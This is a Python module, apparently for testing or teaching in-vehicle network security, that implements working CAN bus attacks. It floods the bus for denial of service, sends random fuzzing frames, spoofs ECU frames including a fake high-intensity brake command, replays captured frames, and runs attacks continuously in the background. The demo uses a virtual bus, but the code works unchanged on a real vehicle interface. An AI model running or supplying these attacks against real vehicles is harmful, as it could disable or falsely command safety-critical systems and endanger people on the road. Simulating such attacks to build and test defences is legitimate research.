"""
Attack Simulator - Simulates various CAN bus attacks
"""

import can
import time
import random
from threading import Thread
from enum import Enum
from typing import Optional


class AttackType(Enum):
    """Types of CAN bus attacks"""
    DOS = "Denial of Service"
    FUZZING = "Fuzzing"
    SPOOFING = "Spoofing"
    REPLAY = "Replay"


class AttackSimulator:
    """Simulates various CAN bus attacks"""
    
    def __init__(self, bus: can.Bus):
        self.bus = bus
        self.running = False
        self.attack_thread = None
        self.messages_sent = 0
        
    def dos_attack(self, target_id: int = 0x200, duration: float = 5.0, 
                   rate: Optional[float] = None):
        """
        Denial of Service Attack
        Floods the bus with high-priority messages to starve other ECUs
        
        Args:
            target_id: CAN ID to flood (lower = higher priority)
            duration: How long to run attack (seconds)
            rate: Messages per second (None = as fast as possible)
        """
        print(f"\n[ATTACK] Starting DoS Attack")
        print(f"  Target ID: 0x{target_id:03X}")
        print(f"  Duration: {duration}s")
        print(f"  Rate: {'Maximum' if rate is None else f'{rate} msg/s'}")
        
        start_time = time.time()
        count = 0
        
        while time.time() - start_time < duration:
            msg = can.Message(
                arbitration_id=target_id,
                data=[0xFF] * 8,  # All high bits
                is_extended_id=False
            )
            
            try:
                self.bus.send(msg)
                count += 1
                
                if rate:
                    time.sleep(1.0 / rate)
            except Exception as e:
                print(f"  Error: {e}")
                break
        
        elapsed = time.time() - start_time
        actual_rate = count / elapsed
        
        print(f"[ATTACK] DoS Complete")
        print(f"  Messages sent: {count}")
        print(f"  Actual rate: {actual_rate:.2f} msg/s")
        print(f"  Duration: {elapsed:.2f}s\n")
        
        self.messages_sent = count
        return count
    
    def fuzzing_attack(self, target_id: int = 0x760, duration: float = 5.0,
                       rate: float = 100):
        """
        Fuzzing Attack
        Sends random data to discover vulnerabilities
        
        Args:
            target_id: CAN ID to target
            duration: How long to run attack (seconds)
            rate: Messages per second
        """
        print(f"\n[ATTACK] Starting Fuzzing Attack")
        print(f"  Target ID: 0x{target_id:03X}")
        print(f"  Duration: {duration}s")
        print(f"  Rate: {rate} msg/s")
        
        start_time = time.time()
        count = 0
        
        while time.time() - start_time < duration:
            # Generate completely random data
            data = [random.randint(0, 255) for _ in range(8)]
            
            msg = can.Message(
                arbitration_id=target_id,
                data=data,
                is_extended_id=False
            )
            
            try:
                self.bus.send(msg)
                count += 1
                time.sleep(1.0 / rate)
            except Exception as e:
                print(f"  Error: {e}")
                break
        
        elapsed = time.time() - start_time
        
        print(f"[ATTACK] Fuzzing Complete")
        print(f"  Messages sent: {count}")
        print(f"  Duration: {elapsed:.2f}s\n")
        
        self.messages_sent = count
        return count
    
    def spoofing_attack(self, spoof_id: int = 0x760, duration: float = 5.0,
                       rate: float = 50, malicious_payload: Optional[list] = None):
        """
        Spoofing/Impersonation Attack
        Pretends to be a legitimate ECU (e.g., brakes) and sends false commands
        
        Args:
            spoof_id: CAN ID to impersonate
            duration: How long to run attack (seconds)
            rate: Messages per second
            malicious_payload: Specific payload to send (or None for random)
        """
        print(f"\n[ATTACK] Starting Spoofing Attack")
        print(f"  Impersonating ID: 0x{spoof_id:03X}")
        print(f"  Duration: {duration}s")
        print(f"  Rate: {rate} msg/s")
        
        start_time = time.time()
        count = 0
        
        while time.time() - start_time < duration:
            if malicious_payload:
                data = malicious_payload
            else:
                # Generate malicious-looking data
                # Example: fake brake command
                data = [
                    0xFF,  # Brake active
                    0x00,
                    random.randint(200, 255),  # High brake intensity
                    0x00,
                    random.randint(0, 255),
                    0x00, 0x00, 0x00
                ]
            
            msg = can.Message(
                arbitration_id=spoof_id,
                data=data[:8],
                is_extended_id=False
            )
            
            try:
                self.bus.send(msg)
                count += 1
                time.sleep(1.0 / rate)
            except Exception as e:
                print(f"  Error: {e}")
                break
        
        elapsed = time.time() - start_time
        
        print(f"[ATTACK] Spoofing Complete")
        print(f"  Messages sent: {count}")
        print(f"  Duration: {elapsed:.2f}s\n")
        
        self.messages_sent = count
        return count
    
    def replay_attack(self, captured_message: can.Message, count: int = 100,
                     rate: float = 100):
        """
        Replay Attack
        Captures and replays a legitimate message
        
        Args:
            captured_message: The message to replay
            count: Number of times to replay
            rate: Messages per second
        """
        print(f"\n[ATTACK] Starting Replay Attack")
        print(f"  Replaying ID: 0x{captured_message.arbitration_id:03X}")
        print(f"  Count: {count}")
        print(f"  Rate: {rate} msg/s")
        
        sent = 0
        start_time = time.time()
        
        for i in range(count):
            try:
                self.bus.send(captured_message)
                sent += 1
                time.sleep(1.0 / rate)
            except Exception as e:
                print(f"  Error: {e}")
                break
        
        elapsed = time.time() - start_time
        
        print(f"[ATTACK] Replay Complete")
        print(f"  Messages sent: {sent}")
        print(f"  Duration: {elapsed:.2f}s\n")
        
        self.messages_sent = sent
        return sent
    
    def run_attack_sequence(self, attacks: list):
        """
        Run a sequence of attacks with delays between them
        
        Args:
            attacks: List of tuples (attack_func, kwargs, delay_after)
        
        Example:
            attacks = [
                (attacker.dos_attack, {'duration': 2}, 1.0),
                (attacker.fuzzing_attack, {'duration': 2}, 1.0),
            ]
        """
        print(f"\n{'='*60}")
        print("RUNNING ATTACK SEQUENCE")
        print(f"{'='*60}\n")
        
        total_messages = 0
        
        for idx, (attack_func, kwargs, delay) in enumerate(attacks, 1):
            print(f"Attack {idx}/{len(attacks)}")
            count = attack_func(**kwargs)
            total_messages += count
            
            if delay > 0 and idx < len(attacks):
                print(f"  Waiting {delay}s before next attack...\n")
                time.sleep(delay)
        
        print(f"{'='*60}")
        print(f"ATTACK SEQUENCE COMPLETE")
        print(f"Total malicious messages sent: {total_messages}")
        print(f"{'='*60}\n")
        
        return total_messages


class ContinuousAttacker:
    """Runs an attack continuously in background"""
    
    def __init__(self, bus: can.Bus, attack_type: AttackType, **kwargs):
        self.bus = bus
        self.attack_type = attack_type
        self.kwargs = kwargs
        self.running = False
        self.thread = None
        self.simulator = AttackSimulator(bus)
        
    def start(self):
        """Start continuous attack"""
        if self.running:
            return
        
        self.running = True
        self.thread = Thread(target=self._attack_loop, daemon=True)
        self.thread.start()
        print(f"[CONTINUOUS ATTACK] Started {self.attack_type.value}")
    
    def _attack_loop(self):
        """Continuously run attack"""
        while self.running:
            if self.attack_type == AttackType.DOS:
                self.simulator.dos_attack(**self.kwargs)
            elif self.attack_type == AttackType.FUZZING:
                self.simulator.fuzzing_attack(**self.kwargs)
            elif self.attack_type == AttackType.SPOOFING:
                self.simulator.spoofing_attack(**self.kwargs)
            
            time.sleep(0.5)  # Brief pause between attacks
    
    def stop(self):
        """Stop continuous attack"""
        self.running = False
        if self.thread:
            self.thread.join(timeout=2.0)
        print(f"[CONTINUOUS ATTACK] Stopped {self.attack_type.value}")


# Example usage
if __name__ == "__main__":
    # Create virtual CAN bus
    bus = can.interface.Bus('test', bustype='virtual')
    
    # Create attacker
    attacker = AttackSimulator(bus)
    
    # Run individual attacks
    attacker.dos_attack(target_id=0x200, duration=2)
    time.sleep(1)
    
    attacker.fuzzing_attack(target_id=0x760, duration=2)
    time.sleep(1)
    
    attacker.spoofing_attack(spoof_id=0x760, duration=2)
    
    # Or run attack sequence
    attacks = [
        (attacker.dos_attack, {'target_id': 0x200, 'duration': 2}, 1.0),
        (attacker.fuzzing_attack, {'target_id': 0x760, 'duration': 2}, 1.0),
        (attacker.spoofing_attack, {'spoof_id': 0x761, 'duration': 2}, 0),
    ]
    
    attacker.run_attack_sequence(attacks)